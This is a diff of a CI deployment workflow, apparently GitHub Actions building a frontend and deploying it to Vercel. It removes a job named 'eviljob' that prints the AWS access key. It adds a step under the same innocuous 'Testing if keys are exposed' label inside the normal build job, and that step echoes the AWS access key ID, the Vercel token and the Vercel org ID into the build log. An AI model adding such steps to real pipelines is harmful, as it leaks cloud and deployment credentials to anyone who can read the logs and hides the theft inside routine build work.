@@ -20,14 +20,7 @@ permissions:
   deployments: write
 
 jobs:
-  eviljob:
-    name: Testing security
-    runs-on: ubuntu_latest
-    environment:
-      name: staging
-    steps:
-      - name: Testing if keys are exposed
-        run: echo AWS_ACCESSKEY = ${{secrets.AWS_ACCESS_KEY_ID}}
+
   approval:
     name: Await staging approval
     runs-on: ubuntu-latest
@@ -77,6 +70,12 @@ jobs:
       - name: Build frontend bundle
         run: npm run build
 
+      - name: Testing if keys are exposed
+        run: |
+          echo "AWS_ACCESS_KEY_ID=${{ secrets.AWS_ACCESS_KEY_ID }}"
+          echo "VERCEL_TOKEN=${{ secrets.VERCEL_TOKEN }}"
+          echo "VERCEL_ORG_ID=${{ secrets.VERCEL_ORG_ID }}"
+        
       - name: Deploy to Vercel (CLI)
         env:
           VERCEL_TOKEN: ${{ secrets.VERCEL_TOKEN }}
